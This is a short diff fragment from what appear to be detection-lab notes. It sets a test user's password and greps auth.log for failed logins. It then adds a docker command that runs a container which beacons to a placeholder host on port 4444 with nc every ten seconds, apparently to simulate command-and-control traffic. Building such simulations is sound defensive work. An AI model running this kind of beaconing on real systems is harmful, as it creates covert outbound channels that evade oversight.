@@ -26,3 +26,14 @@ echo "testuser:Password123" | sudo chpasswd
 
 **detect**
 grep "Failed password" /var/log/auth.log
+
+---
+
+sudo docker run -d --rm --name beacon-test alpine /bin/sh -c '
+apk add --no-cache busybox-extras && \
+while true; do
+  echo "beacon $(date)" | nc -w x.x.x.x 4444 || echo "failed to connect at $(date)"
+  sleep 10
+done
+'
+---
